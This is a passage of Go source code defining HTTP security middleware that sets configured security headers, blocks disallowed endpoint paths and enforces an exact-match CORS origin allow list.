	log.Printf("CONFIG_AUDIT: %s", string(auditJSON))
}

// SecurityMiddleware returns HTTP middleware with all security controls
func (c *SecureConfig) SecurityMiddleware() func(http.Handler) http.Handler {
	return func(next http.Handler) http.Handler {
		return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			// Apply security headers
			for header, value := range c.SecurityHeaders {
				w.Header().Set(header, value)
			}

			// Block disallowed endpoints
			for endpoint, allowed := range c.AllowedEndpoints {
				if !allowed && strings.HasPrefix(r.URL.Path, endpoint) {
					log.Printf("SECURITY: Blocked access to %s from %s", r.URL.Path, r.RemoteAddr)
					http.Error(w, "Not Found", http.StatusNotFound)
					return
				}
			}

			// Handle CORS
			origin := r.Header.Get("Origin")
			if c.isOriginAllowed(origin) {
				w.Header().Set("Access-Control-Allow-Origin", origin)
				w.Header().Set("Access-Control-Allow-Methods", strings.Join(c.CORSConfig.AllowedMethods, ", "))
				w.Header().Set("Access-Control-Allow-Headers", strings.Join(c.CORSConfig.AllowedHeaders, ", "))
				if c.CORSConfig.AllowCredentials {
					w.Header().Set("Access-Control-Allow-Credentials", "true")
				}
			}

			if r.Method == "OPTIONS" {
				w.WriteHeader(http.StatusNoContent)
				return
			}

			next.ServeHTTP(w, r)
		})
	}
}

func (c *SecureConfig) isOriginAllowed(origin string) bool {
	for _, allowed := range c.CORSConfig.AllowedOrigins {
		if allowed == origin {
			return true
		}
	}
	return false
}
